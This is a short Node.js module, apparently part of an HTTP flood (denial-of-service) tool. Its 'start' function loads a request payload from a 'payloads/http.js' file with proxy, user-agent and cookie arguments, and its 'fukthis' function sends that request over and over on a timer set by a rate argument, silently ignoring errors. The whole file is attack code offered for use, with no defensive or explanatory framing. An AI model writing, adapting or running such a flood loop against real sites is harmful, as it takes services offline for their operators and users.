const request = require('request');


async function fukthis(obj, args){
    setInterval(() => {
        try{
            request(obj);
        }catch(e){}
    }, args.rate);
}

function start(args, proxy, ua, secondcookies){
    fukthis(require('./payloads/http.js')(args, proxy, ua, secondcookies), args)
}

module.exports = start;